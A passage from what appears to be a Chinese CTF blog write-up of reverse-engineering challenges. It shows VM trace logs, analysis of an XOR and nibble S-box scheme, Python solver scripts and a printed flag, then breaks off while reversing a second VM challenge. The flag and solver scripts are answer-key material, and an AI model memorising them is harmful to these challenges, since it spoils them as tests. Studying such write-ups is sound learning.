4 = 208</span><br><span class="line">17 = 16 + 1;</span><br><span class="line">85 &gt;&gt; 4 = 5</span><br><span class="line">0 &lt;&lt; 4 = 0</span><br><span class="line">18 = 17 + 1;</span><br><span class="line">70 &gt;&gt; 4 = 4</span><br><span class="line">9 &lt;&lt; 4 = 144</span><br><span class="line">19 = 18 + 1;</span><br><span class="line">176 &gt;&gt; 4 = 11</span><br><span class="line">8 &lt;&lt; 4 = 128</span><br><span class="line">1A = 19 + 1;</span><br><span class="line">175 &gt;&gt; 4 = 10</span><br><span class="line">15 &lt;&lt; 4 = 240</span><br><span class="line">1B = 1A + 1;</span><br><span class="line">154 &gt;&gt; 4 = 9</span><br><span class="line">14 &lt;&lt; 4 = 224</span><br><span class="line">1C = 1B + 1;</span><br><span class="line">137 &gt;&gt; 4 = 8</span><br><span class="line">3 &lt;&lt; 4 = 48</span><br><span class="line">1D = 1C + 1;</span><br><span class="line">228 &gt;&gt; 4 = 14</span><br><span class="line">1 &lt;&lt; 4 = 16</span><br><span class="line">1E = 1D + 1;</span><br><span class="line">210 &gt;&gt; 4 = 13</span><br><span class="line">7 &lt;&lt; 4 = 112</span><br><span class="line">1F = 1E + 1;</span><br><span class="line">207 &gt;&gt; 4 = 12</span><br><span class="line">4 &lt;&lt; 4 = 64</span><br><span class="line">20 = 1F + 1;</span><br><span class="line">60 &gt;&gt; 4 = 3</span><br><span class="line">11 &lt;&lt; 4 = 176</span><br><span class="line">21 = 20 + 1;</span><br><span class="line">41 &gt;&gt; 4 = 2</span><br><span class="line">6 &lt;&lt; 4 = 96</span><br><span class="line">22 = 21 + 1;</span><br><span class="line">6 &gt;&gt; 4 = 0</span><br><span class="line">12 &lt;&lt; 4 = 192</span><br><span class="line">23 = 22 + 1;</span><br><span class="line">1 = 0 + 1;</span><br><span class="line">239 ^ 50 = 221</span><br><span class="line">1 = 0 + 1;</span><br><span class="line">2 = 1 + 1;</span><br><span class="line">50 ^ 28 = 46</span><br><span class="line">2 = 1 + 1;</span><br><span class="line">3 = 2 + 1;</span><br><span class="line">28 ^ 112 = 108</span><br><span class="line">3 = 2 + 1;</span><br><span class="line">4 = 3 + 1;</span><br><span class="line">112 ^ 74 = 58</span><br><span class="line">4 = 3 + 1;</span><br><span class="line">5 = 4 + 1;</span><br><span class="line">74 ^ 179 = 249</span><br><span class="line">5 = 4 + 1;</span><br><span class="line">6 = 5 + 1;</span><br><span class="line">179 ^ 98 = 209</span><br><span class="line">6 = 5 + 1;</span><br><span class="line">7 = 6 + 1;</span><br><span class="line">98 ^ 198 = 164</span><br><span class="line">7 = 6 + 1;</span><br><span class="line">8 = 7 + 1;</span><br><span class="line">198 ^ 213 = 19</span><br><span class="line">8 = 7 + 1;</span><br><span class="line">9 = 8 + 1;</span><br><span class="line">213 ^ 169 = 124</span><br><span class="line">9 = 8 + 1;</span><br><span class="line">A = 9 + 1;</span><br><span class="line">169 ^ 15 = 166</span><br><span class="line">A = 9 + 1;</span><br><span class="line">B = A + 1;</span><br><span class="line">15 ^ 146 = 157</span><br><span class="line">B = A + 1;</span><br><span class="line">C = B + 1;</span><br><span class="line">146 ^ 132 = 22</span><br><span class="line">C = B + 1;</span><br><span class="line">D = C + 1;</span><br><span class="line">132 ^ 229 = 97</span><br><span class="line">D = C + 1;</span><br><span class="line">E = D + 1;</span><br><span class="line">229 ^ 58 = 223</span><br><span class="line">E = D + 1;</span><br><span class="line">F = E + 1;</span><br><span class="line">58 ^ 36 = 30</span><br><span class="line">F = E + 1;</span><br><span class="line">10 = F + 1;</span><br><span class="line">36 ^ 18 = 54</span><br><span class="line">10 = F + 1;</span><br><span class="line">11 = 10 + 1;</span><br><span class="line">18 ^ 127 = 109</span><br><span class="line">11 = 10 + 1;</span><br><span class="line">12 = 11 + 1;</span><br><span class="line">127 ^ 176 = 207</span><br><span class="line">12 = 11 + 1;</span><br><span class="line">13 = 12 + 1;</span><br><span class="line">176 ^ 108 = 220</span><br><span class="line">13 = 12 + 1;</span><br><span class="line">14 = 13 + 1;</span><br><span class="line">108 ^ 86 = 58</span><br><span class="line">14 = 13 + 1;</span><br><span class="line">15 = 14 + 1;</span><br><span class="line">86 ^ 194 = 148</span><br><span class="line">15 = 14 + 1;</span><br><span class="line">16 = 15 + 1;</span><br><span class="line">194 ^ 211 = 17</span><br><span class="line">16 = 15 + 1;</span><br><span class="line">17 = 16 + 1;</span><br><span class="line">211 ^ 0 = 211</span><br><span class="line">17 = 16 + 1;</span><br><span class="line">18 = 17 + 1;</span><br><span class="line">0 ^ 154 = 154</span><br><span class="line">18 = 17 + 1;</span><br><span class="line">19 = 18 + 1;</span><br><span class="line">154 ^ 140 = 22</span><br><span class="line">19 = 18 + 1;</span><br><span class="line">1A = 19 + 1;</span><br><span class="line">140 ^ 242 = 126</span><br><span class="line">1A = 19 + 1;</span><br><span class="line">1B = 1A + 1;</span><br><span class="line">242 ^ 239 = 29</span><br><span class="line">1B = 1A + 1;</span><br><span class="line">1C = 1B + 1;</span><br><span class="line">239 ^ 62 = 209</span><br><span class="line">1C = 1B + 1;</span><br><span class="line">1D = 1C + 1;</span><br><span class="line">62 ^ 25 = 39</span><br><span class="line">1D = 1C + 1;</span><br><span class="line">1E = 1D + 1;</span><br><span class="line">25 ^ 118 = 111</span><br><span class="line">1E = 1D + 1;</span><br><span class="line">1F = 1E + 1;</span><br><span class="line">118 ^ 66 = 52</span><br><span class="line">1F = 1E + 1;</span><br><span class="line">20 = 1F + 1;</span><br><span class="line">66 ^ 180 = 246</span><br><span class="line">20 = 1F + 1;</span><br><span class="line">21 = 20 + 1;</span><br><span class="line">180 ^ 110 = 218</span><br><span class="line">21 = 20 + 1;</span><br><span class="line">22 = 21 + 1;</span><br><span class="line">110 ^ 202 = 164</span><br><span class="line">22 = 21 + 1;</span><br><span class="line">23 = 22 + 1;</span><br><span class="line">202 ^ 221 = 23</span><br><span class="line">23 = 22 + 1;</span><br></pre></td></tr></table></figure>

<p>可以分析得到逻辑</p>
<pre><code>1. 在 vm_execute 的首个循环里，按照索引 i 计算掩码 ((0xAB + 0x13*i) &amp; 0xFF)，并对 buf[i] 做异或。
2. 第二个循环把每个字节拆成高/低 4bit，通过 S 盒 sbox = [0xC,0x5,0x6,0xB,0x9,0x0,0xA,0xD,0x3,0xE,0xF,0x8,0x4,0x7,0x1,0x2] 逐一替换后再组合。
3. 第三个循环按顺序执行 buf[i] ^= buf[(i+1)%35]（最后一个元素用已更新过的 buf[0]）。
4. 校验
</code></pre>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">0 * 19 = 0</span><br><span class="line">AB = 0 + AB;</span><br><span class="line">171 ^ 49 = 154</span><br><span class="line">1 = 0 + 1;</span><br><span class="line">1 * 19 = 19</span><br><span class="line">BE = 13 + AB;</span><br><span class="line"></span><br><span class="line">190 ^ 49 = 143</span><br><span class="line">2 = 1 + 1;</span><br><span class="line">2 * 19 = 38</span><br><span class="line">D1 = 26 + AB;</span><br><span class="line"></span><br><span class="line">209 ^ 49 = 224</span><br><span class="line">3 = 2 + 1;</span><br><span class="line">3 * 19 = 57</span><br><span class="line">E4 = 39 + AB;</span><br></pre></td></tr></table></figure>

<p>很明显一直在更新0x13 ，再加个0xAB 这里dump时候都是16进制</p>
<p>再往下，到 “10 ^ 50 &#x3D; 56 &#x2F; 11D &#x3D; 72 + AB” 这一块，成对出现一条右移或与操作、紧接着又有 LOAD_TABLE16 那些断点打印（在 output.里为 &lt;值&gt; &gt;&gt; 4 &#x3D; …、&lt;值&gt; &lt;&lt; 4 &#x3D; …）。这些输出说明每个字节都被拆成高低 4 bit 送进 S 盒，再合成一个新字节。</p>
<p>所以”很容易”看出是 nibble S-box。</p>
<p>再往后的 “29 ^ 50 &#x3D; 47 … 58 ^ 36 &#x3D; 30 …” 那串，则是 LOAD_IN + ADD 1 + MOD 35 + XOR 的动作：输出[i] &#x3D; buffer[i] ^ buffer[(i+1)%35]。日志可以直白地呈现出 “A ^&#x3D; B”。特别是倒数几行还能看到最后一个元素在用已经更新过的 buffer[0]，说明是环形依赖。</p>
<p>stage2你要结合这个</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013195026065.png" alt="image-20251013195026065"></p>
<p>其实还是有点难想到的</p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">enc = [</span><br><span class="line">    <span class="number">0x35</span>, <span class="number">0xF1</span>, <span class="number">0x6A</span>, <span class="number">0x09</span>, <span class="number">0xE8</span>, <span class="number">0x60</span>, <span class="number">0x95</span>, <span class="number">0xC7</span>, <span class="number">0xF5</span>, <span class="number">0xFE</span>,</span><br><span class="line">    <span class="number">0x3F</span>, <span class="number">0x29</span>, <span class="number">0xA8</span>, <span class="number">0xA7</span>, <span class="number">0x65</span>, <span class="number">0x11</span>, <span class="number">0xBD</span>, <span class="number">0x34</span>, <span class="number">0xB9</span>, <span class="number">0x53</span>,</span><br><span class="line">    <span class="number">0x92</span>, <span class="number">0x60</span>, <span class="number">0x1A</span>, <span class="number">0x7E</span>, <span class="number">0x46</span>, <span class="number">0xAA</span>, <span class="number">0x59</span>, <span class="number">0x56</span>, <span class="number">0x18</span>, <span class="number">0xBC</span>,</span><br><span class="line">    <span class="number">0x7A</span>, <span class="number">0x5B</span>, <span class="number">0x71</span>, <span class="number">0x4F</span>, <span class="number">0xA1</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">sbox = [<span class="number">0xC</span>, <span class="number">0x5</span>, <span class="number">0x6</span>, <span class="number">0xB</span>, <span class="number">0x9</span>, <span class="number">0x0</span>, <span class="number">0xA</span>, <span class="number">0xD</span>, <span class="number">0x3</span>, <span class="number">0xE</span>, <span class="number">0xF</span>, <span class="number">0x8</span>, <span class="number">0x4</span>, <span class="number">0x7</span>, <span class="number">0x1</span>, <span class="number">0x2</span>]</span><br><span class="line">inv_sbox = &#123;v: i <span class="keyword">for</span> i, v <span class="keyword">in</span> <span class="built_in">enumerate</span>(sbox)&#125;</span><br><span class="line"></span><br><span class="line">n = <span class="built_in">len</span>(enc)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 环形xor</span></span><br><span class="line">xor_prefix = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n - <span class="number">1</span>):</span><br><span class="line">    xor_prefix ^= enc[i]</span><br><span class="line"></span><br><span class="line">stage2 = [<span class="number">0</span>] * n</span><br><span class="line">stage2[<span class="number">0</span>] = enc[-<span class="number">1</span>] ^ xor_prefix ^ enc[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n - <span class="number">1</span>):</span><br><span class="line">    stage2[i + <span class="number">1</span>] = stage2[i] ^ enc[i]</span><br><span class="line"></span><br><span class="line"><span class="comment"># sbox</span></span><br><span class="line">stage1 = []</span><br><span class="line"><span class="keyword">for</span> b <span class="keyword">in</span> stage2:</span><br><span class="line">    hi = inv_sbox[b &gt;&gt; <span class="number">4</span>]</span><br><span class="line">    lo = inv_sbox[b &amp; <span class="number">0xF</span>]</span><br><span class="line">    stage1.append((hi &lt;&lt; <span class="number">4</span>) | lo)</span><br><span class="line"></span><br><span class="line"><span class="comment"># xor</span></span><br><span class="line">flag = []</span><br><span class="line"><span class="keyword">for</span> i, b <span class="keyword">in</span> <span class="built_in">enumerate</span>(stage1):</span><br><span class="line">    mask = (<span class="number">0xAB</span> + <span class="number">0x13</span> * i) &amp; <span class="number">0xFF</span></span><br><span class="line">    flag.append(b ^ mask)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(flag).decode())</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TSCTF-J&#123;Y0u_@4r3_R4@11&amp;_s0lxE_VVmm&#125;</span><br></pre></td></tr></table></figure>

<h3 id="ez-re"><a href="#ez-re" class="headerlink" title="ez_re"></a>ez_re</h3><p>侥幸之前看过(大概做到了把虚拟机的是线性变换发现就没做了hh)，但没有出，赛中出了</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013200533177.png" alt="image-20251013200533177"></p>
<p>这里有个54C8函数进去看看</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013200557720.png" alt="image-20251013200557720"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013201401830.png" alt="image-20251013201401830"></p>
<p>结合55F4一起看，unk_1000096C0有点像vmcode不确定，55F4有点像vm的代码 switch的</p>
<p>没有发现主要的加密逻辑，基本能确定是vm了</p>
<p>sub_1000054C8这个方法，其实就是在做搭虚拟机实例，同时申请了三块区域，可能是虚拟机需要的数据区</p>
<p>一次ka你了 sub_1000057C8 等十余个函数，发现逻辑都很底层（逐位加法、移位乘法、手工 XOR）。根据行为重命名：vm_op_set_reg、vm_op_add_regs、vm_op_store_mem 等。例如 sub_100005d30 检查 data+0x1D6 的比较结果 + 36 次计数后输出“right”，因此这是终止条件。</p>
<p>输入长度为36</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013202635050.png" alt="image-20251013202635050"></p>
<p>55F4函数中 VM执行 ，遍历 8 字节的指令槽，读取末尾的 16 bit opcode，根据 opcode 调用 vtable 上不同的处理函数。循环次数固定 74888&#x2F;8&#x3D;9361 次</p>
<p>一次确认了那些函数的作用，如下面是一个加法操作</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013203246478.png" alt="image-20251013203246478"></p>
<p>有点抽象，这些vm_add的确实有点抽象，问GPT就知道了</p>
<p>做了个重命名</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013204617528.png" alt="image-20251013204617528"></p>
<p>sub_1000054C8把 off_1000080F8 填进新对象的第一个指针，并没有把它复制到字节码区，而是保存在结构的第一个字段。随后 vm_interpret 里，取指令时是从 v1[1]（也就是那块 0x14000 的缓冲）按 8 字节顺序读取，并把第四个 16 位字段当 opcode(v3 + n74888 + 6)。</p>
<p>其他三个 16 位字段（0&#x2F;2&#x2F;4）从未直接拿来做分支，只在各 handler 内按寄存器索引，内存地址等用途被解读。</p>
<p>前三个是操作数</p>
<p>之后想要进展，我们需要确认vm内存布局</p>
<p>解释器在 vm_write_data16&#x2F;vm_read_data16 等函数里不停地对某块内存+偏移做读写。如果不知道这些偏移对应什么，就无法理解每条 opcode 对状态的影响</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013205257487.png" alt="image-20251013205257487"></p>
<p>注意到几个信息</p>
<p>vm_write_small_reg 的实现是：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013205844754.png" alt="image-20251013205844754"></p>
<p>在做赋值操作，说明四个寄存器就放在数据块偏移 0x200 开始的连续 8 字节里。vm_read_small_reg 用同样的偏移读数，所以寄存器位点确定无疑。</p>
<blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">如果参数 idx 在 1..4，就把 val 存到 base + 0x200 + 2*(idx-1)。与之成对的 vm_read_small_reg 用完全相同的偏移取回这个值。很明显这就是对固定数量槽位的读写，而不像普通内存（普通内存用的是 base + 2*addr）</span><br></pre></td></tr></table></figure>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013210000999.png" alt="image-20251013210000999"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">相当于 *(WORD *)(context + 0x1D6) = (regA == regB);</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013210326302.png" alt="image-20251013210326302"></p>
<p>输入字符串在 data[0..35] ，4 个 16 位寄存器在 data+0x200，比较结果在 data+0x1D6，成功计数在 data+0x1D8</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vm_op_check_success 则先检查这个字，再把 *(WORD *)(context + 0x1D8) 自增；当它增到 36 时返回 “right”，否则若有任意一次失败直接调用 sub_1000055DC(&quot;wrong\n&quot;) 退出。这样就能定位比较结果和计数器的具体偏移。</span><br></pre></td></tr></table></figure>

<p>普通内存读写是：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013210408496.png" alt="image-20251013210408496"></p>
<p>总结下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data+idx*2 属于通用内存，data+0x200 起是4个寄存器槽，data+0x1D6/0x1D8 储存比较标志和成功计数。输入字符串被run_vm_from_input写进数据区开头</span><br></pre></td></tr></table></figure>

<p>因为vim_interpret是8字节8字节读取的，看逻辑我们解释器的 switch 里，合法opcode只有 case 1 到case 0xC共 12 种，自己手动确认了下确实那一段是bytecode,也可以写个小脚本读取确认下</p>
<p>确定字节码起点 0x96c0 后，我用 Python 读取那段数据，并按 8 字节一步解成 (arg0, arg1, arg2, opcode) 四个 16 位数，打印前面几十条</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;chall&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.seek(<span class="number">0x96c0</span>)</span><br><span class="line">    data=f.read(<span class="number">9360</span>*<span class="number">8</span>)</span><br><span class="line">insts=[struct.unpack_from(<span class="string">&#x27;&lt;HHHH&#x27;</span>, data, i*<span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">255</span>)]</span><br><span class="line"><span class="keyword">for</span> i,(a,b,c,op) <span class="keyword">in</span> <span class="built_in">enumerate</span>(insts):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;i:04d&#125;</span>: op=<span class="subst">&#123;op:04x&#125;</span> args=(<span class="subst">&#123;a:04x&#125;</span>,<span class="subst">&#123;b:04x&#125;</span>,<span class="subst">&#123;c:04x&#125;</span>)&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>能发现a1516这样的块重复出现了约36次，对应flag长度36</p>
<p>输出显示比较总是在指令号 258、518、778…出现，而下一个 op&#x3D;9 紧随其后（259、519、779…）。因此每两次比较之间隔着 260 条指令，取这段长度作为一个块再去分析就能覆盖整个逻辑</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013212545236.png" alt="image-20251013212545236"></p>
<p>7出现的次数与flag长度相同也有理由怀疑其是cmp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;chall&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.seek(<span class="number">0x96c0</span>)</span><br><span class="line">    data = f.read(<span class="number">9360</span> * <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">insts = [struct.unpack_from(<span class="string">&#x27;&lt;HHHH&#x27;</span>, data, i * <span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9360</span>)]</span><br><span class="line"></span><br><span class="line"><span class="comment"># for i, (a, b, c, op) in enumerate(insts):</span></span><br><span class="line"><span class="comment">#     print(f&#x27;&#123;i:04d&#125;: op=&#123;op:04x&#125; args=(&#123;a:04x&#125;,&#123;b:04x&#125;,&#123;c:04x&#125;)&#x27;)</span></span><br><span class="line"></span><br><span class="line">ops_used = &#123;op <span class="keyword">for</span> _, _, _, op <span class="keyword">in</span> insts&#125;</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;\nunique opcodes in first 9360 instructions: <span class="subst">&#123;<span class="built_in">sorted</span>(ops_used)&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unique opcodes in first 300 instructions: [1, 3, 4, 5, 6, 7, 9, 10]</span><br></pre></td></tr></table></figure>

<p>只出现了这8种指令[1, 3, 4, 5, 6, 7, 9, 10]</p>
<p>意味着在整块里出现的 opcode 只有 1（set）、3（加）、4（xor）、5（store）、6（load）、7（compare）、9（check）、10（减）。发现 4 总是成对地把同一个寄存器和自己 XOR 为 0，用来清寄存器。没有乘法、取反、非线性操作。</p>
<p>很多条指令都是 op&#x3D;0001 args&#x3D;(0001,0026,0000)，即把寄存器 1 设为常量 0x26。接着马上就有 op&#x3D;0005 args&#x3D;(0001,0003,0000)，即用寄存器 1 里的值当地址，把寄存器 3 的内容写进数据区。这一对组合出现多次，说明 0x26 这个槽一直被当作累加器。</p>
<p>本题最终要的就是找指令规律和明确对应关系，还是要多试</p>
<p>我们可以写一个新的测试脚本探寻规律</p>
<p>可以用”临时线性化脚本”，其实就是把每条 opcode 的作用改写成”在字典里做加减”</p>
<ol>
<li><p>把一块 260 条指令读出来，每条 8 字节拆成 (dst, op1, op2, opcode)。</p>
</li>
<li><p>用字典表示寄存器&#x2F;内存的线性表达式：</p>
<ul>
<li>{‘const’: 0, ‘x0’:1, ‘x5’:65535} 表示 x0 - x5（因为 65535 ≡ -1 mod 65536）。</li>
<li>初始时 mem[i] &#x3D; {‘xi’:1, ‘const’:0} 代表输入的第 i 个字符。</li>
</ul>
</li>
<li><p>根据 opcode 更新这些字典：</p>
<ul>
<li>1：寄存器 ← 常量 → {‘const’: imm}。</li>
<li>3&#x2F;10：寄存器 ← 加&#x2F;减 → 合并字典系数。</li>
<li>5&#x2F;6：以寄存器值当地址，读写 mem。</li>
<li>4：异或清零 → 写成 {‘const’:0}。</li>
<li>7 之后我们不再需要处理（它只做比较）。</li>
</ul>
</li>
<li><pre><code> 块结束时，读出 mem[0x26]，得到某个输入字符的线性组合，regs[1][&#39;const&#39;] 就是常量目标。
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">测试代码：</span><br><span class="line"></span><br><span class="line">&gt; 这个脚本挺难写的还好GPT5帮忙了，不然真写不出来......</span><br><span class="line"></span><br><span class="line">```python</span><br><span class="line">import struct</span><br><span class="line">from fractions import Fraction</span><br><span class="line"></span><br><span class="line">MOD = 1 &lt;&lt; 16</span><br><span class="line">BLOCK_SIZE = 260</span><br><span class="line">NUM_BLOCKS = 36</span><br><span class="line">BYTECODE_OFFSET = 0x96C0</span><br><span class="line">BYTECODE_LEN = BLOCK_SIZE * NUM_BLOCKS * 8</span><br><span class="line"></span><br><span class="line">def expr_const(v):</span><br><span class="line">    return &#123;&#x27;const&#x27;: v % MOD&#125;</span><br><span class="line"></span><br><span class="line">def expr_add(e1, e2):</span><br><span class="line">    keys = set(e1) | set(e2)</span><br><span class="line">    return &#123;k: (e1.get(k, 0) + e2.get(k, 0)) % MOD for k in keys&#125;</span><br><span class="line"></span><br><span class="line">def expr_sub(e1, e2):</span><br><span class="line">    keys = set(e1) | set(e2)</span><br><span class="line">    return &#123;k: (e1.get(k, 0) - e2.get(k, 0)) % MOD for k in keys&#125;</span><br><span class="line"></span><br><span class="line">def norm16(v):</span><br><span class="line">    return v - 0x10000 if v &gt;= 0x8000 else v</span><br><span class="line"></span><br><span class="line">def run_block(insts):</span><br><span class="line">    regs = &#123;i: &#123;&#x27;const&#x27;: 0&#125; for i in range(1, 5)&#125;</span><br><span class="line">    mem = &#123;i: &#123;f&#x27;x&#123;i&#125;&#x27;: 1, &#x27;const&#x27;: 0&#125; for i in range(36)&#125;</span><br><span class="line">    mem[0x26] = &#123;&#x27;const&#x27;: 0&#125;</span><br><span class="line">    for dst, op1, op2, opcode in insts:</span><br><span class="line">        if opcode == 1:  # set reg</span><br><span class="line">            regs[dst] = expr_const(op1)</span><br><span class="line">        elif opcode == 3:  # add</span><br><span class="line">            regs[dst] = expr_add(regs[op1], regs[op2])</span><br><span class="line">        elif opcode == 10:  # sub</span><br><span 